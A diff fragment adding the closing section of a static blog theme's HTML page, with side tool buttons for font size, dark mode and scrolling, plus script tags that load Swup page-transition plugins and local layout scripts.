+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
